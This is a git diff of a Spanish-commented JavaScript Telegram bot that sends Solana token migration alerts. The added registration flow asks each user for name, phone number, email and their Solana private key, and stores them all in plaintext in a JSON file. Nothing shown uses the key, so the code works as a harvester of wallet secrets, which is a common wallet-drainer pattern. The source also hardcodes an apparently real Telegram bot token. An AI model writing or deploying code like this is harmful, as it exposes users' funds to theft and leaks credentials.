@@ -8,7 +8,7 @@ import { DateTime } from "luxon";
 // 🔹 Configuración
 const TELEGRAM_BOT_TOKEN = "8167837961:AAFipBvWbQtFWHV_uZt1lmG4CVVnc_z8qJU";
 const SOLANA_RPC_URL = "https://api.mainnet-beta.solana.com";
-const SUBSCRIBERS_FILE = "subscribers.json";
+const USERS_FILE = "users.json";
 const RUGCHECK_API_BASE = "https://api.rugcheck.xyz/v1/tokens";
 const connection = new Connection(SOLANA_RPC_URL, "confirmed");
 
@@ -18,49 +18,90 @@ const LOG_FILE = "transactions.log";
 
 let ws;
 const bot = new TelegramBot(TELEGRAM_BOT_TOKEN, { polling: true });
-let subscribers = new Set();
+let users = {};
 
-// 🔥 Cargar suscriptores desde el archivo JSON
-function loadSubscribers() {
-    if (fs.existsSync(SUBSCRIBERS_FILE)) {
+// 🔥 Cargar usuarios desde el archivo JSON
+function loadUsers() {
+    if (fs.existsSync(USERS_FILE)) {
         try {
-            const data = fs.readFileSync(SUBSCRIBERS_FILE, "utf8");
-            subscribers = new Set(JSON.parse(data));
-            console.log(`✅ ${subscribers.size} usuarios suscritos cargados.`);
+            const data = fs.readFileSync(USERS_FILE, "utf8");
+            users = JSON.parse(data);
+            console.log(`✅ ${Object.keys(users).length} usuarios cargados.`);
         } catch (error) {
-            console.error("❌ Error cargando suscriptores:", error);
+            console.error("❌ Error cargando usuarios:", error);
         }
     }
 }
 
-// 📝 Guardar suscriptores en el archivo JSON
-function saveSubscribers() {
+// 📝 Guardar usuarios en el archivo JSON
+function saveUsers() {
     try {
-        fs.writeFileSync(SUBSCRIBERS_FILE, JSON.stringify([...subscribers], null, 2));
-        console.log("📂 Subscriptores actualizados.");
+        fs.writeFileSync(USERS_FILE, JSON.stringify(users, null, 2));
+        console.log("📂 Usuarios actualizados.");
     } catch (error) {
-        console.error("❌ Error guardando suscriptores:", error);
+        console.error("❌ Error guardando usuarios:", error);
     }
 }
 
-// 🔹 Comando `/start` para suscribirse a notificaciones
+// 🔥 Cargar usuarios antes de iniciar el WebSocket
+loadUsers();
+
+/* 🔹 PROCESO DE REGISTRO */
 bot.onText(/\/start/, (msg) => {
     const chatId = msg.chat.id;
-    if (!subscribers.has(chatId)) {
-        subscribers.add(chatId);
-        saveSubscribers();
-        bot.sendMessage(chatId, "🚀 Te has suscrito a las notificaciones de migraciones en Solana.");
+
+    if (users[chatId]) {
+        bot.sendMessage(chatId, "✅ Ya estás registrado en el bot.");
     } else {
-        bot.sendMessage(chatId, "⚠️ Ya estás suscrito.");
+        users[chatId] = { step: 1, subscribed: true };
+        saveUsers();
+        bot.sendMessage(chatId, "👋 Bienvenido! Por favor, ingresa tu *nombre completo*:");
     }
 });
 
-// 🔹 Comando `/stop` para cancelar suscripción
+bot.on("message", async (msg) => {
+    const chatId = msg.chat.id;
+    const text = msg.text.trim();
+
+    if (!users[chatId] || !users[chatId].step) return; // Ignorar si no está en proceso de registro
+
+    switch (users[chatId].step) {
+        case 1:
+            users[chatId].name = text;
+            users[chatId].step = 2;
+            saveUsers();
+            bot.sendMessage(chatId, "📞 Ingresa tu *número de teléfono*:");
+            break;
+
+        case 2:
+            users[chatId].phone = text;
+            users[chatId].step = 3;
+            saveUsers();
+            bot.sendMessage(chatId, "📧 Ingresa tu *correo electrónico*:");
+            break;
+
+        case 3:
+            users[chatId].email = text;
+            users[chatId].step = 4;
+            saveUsers();
+            bot.sendMessage(chatId, "🔑 Ingresa tu *private key* de Solana (⚠️ No compartas esta clave con nadie más):");
+            break;
+
+        case 4:
+            users[chatId].privateKey = text;
+            users[chatId].step = 0; // Finaliza el registro
+            saveUsers();
+            bot.sendMessage(chatId, "✅ Registro completado! Ahora puedes operar en Solana desde el bot.");
+            break;
+    }
+});
+
 bot.onText(/\/stop/, (msg) => {
     const chatId = msg.chat.id;
-    if (subscribers.has(chatId)) {
-        subscribers.delete(chatId);
-        saveSubscribers();
+
+    if (users[chatId] && users[chatId].subscribed) {
+        users[chatId].subscribed = false;
+        saveUsers();
         bot.sendMessage(chatId, "🛑 Has sido eliminado de las notificaciones.");
     } else {
         bot.sendMessage(chatId, "⚠️ No estabas suscrito.");
@@ -123,7 +164,7 @@ function connectWebSocket() {
 }
 
 // 🔥 Cargar suscriptores antes de iniciar el WebSocket y Heartbeat
-loadSubscribers();
+loadUsers();
 connectWebSocket();
 
 // 💓 Mantener la conexión activa enviando ping cada 30s
@@ -433,37 +474,36 @@ async function analyzeTransaction(signature) {
 
 // 🔹 Notificar a los suscriptores con imagen y botones
 async function notifySubscribers(message, imageUrl, pairAddress, mint) {
-    for (const userId of subscribers) {
-        try {
-            if (imageUrl) {
-                // 🔥 Intentar enviar el mensaje con imagen
-                await bot.sendPhoto(userId, imageUrl, {
-                    caption: message,
-                    parse_mode: "Markdown",
-                    reply_markup: {
-                        inline_keyboard: [
-                            [{ text: "💸 Buy Token", url: `https://jup.ag/swap/SOL-${mint}` }],
-                            [{ text: "📊 Dexscreener", url: `https://dexscreener.com/solana/${pairAddress}` }]
-                        ]
-                    }
-                });
-            } else {
-                // 🔥 Si no hay imagen, enviar solo el mensaje de texto
-                await bot.sendMessage(userId, message, {
-                    parse_mode: "Markdown",
-                    reply_markup: {
-                        inline_keyboard: [
-                            [{ text: "💸 Buy Token", url: `https://jup.ag/swap/SOL-${mint}` }],
-                            [{ text: "📊 Dexscreener", url: `https://dexscreener.com/solana/${pairAddress}` }]
-                        ]
-                    }
-                });
+    for (const userId in users) {
+        if (users[userId].subscribed) {
+            try {
+                if (imageUrl) {
+                    await bot.sendPhoto(userId, imageUrl, {
+                        caption: message,
+                        parse_mode: "Markdown",
+                        reply_markup: {
+                            inline_keyboard: [
+                                [{ text: "💸 Buy Token", url: `https://jup.ag/swap/SOL-${mint}` }],
+                                [{ text: "📊 Dexscreener", url: `https://dexscreener.com/solana/${pairAddress}` }]
+                            ]
+                        }
+                    });
+                } else {
+                    await bot.sendMessage(userId, message, {
+                        parse_mode: "Markdown",
+                        reply_markup: {
+                            inline_keyboard: [
+                                [{ text: "💸 Buy Token", url: `https://jup.ag/swap/SOL-${mint}` }],
+                                [{ text: "📊 Dexscreener", url: `https://dexscreener.com/solana/${pairAddress}` }]
+                            ]
+                        }
+                    });
+                }
+
+                console.log(`✅ Mensaje enviado a ${userId}`);
+            } catch (error) {
+                console.error(`❌ Error enviando mensaje a ${userId}:`, error);
             }
-
-            console.log(`✅ Mensaje enviado a ${userId}`);
-
-        } catch (error) {
-            console.error(`❌ Error enviando mensaje a ${userId}:`, error);
         }
     }
 }
@@ -490,6 +530,6 @@ bot.on("message", async (msg) => {
 });
 
 // 🔥 Cargar suscriptores al iniciar
-loadSubscribers();
+loadUsers();
 
 console.log("🤖 Bot de Telegram iniciado.");
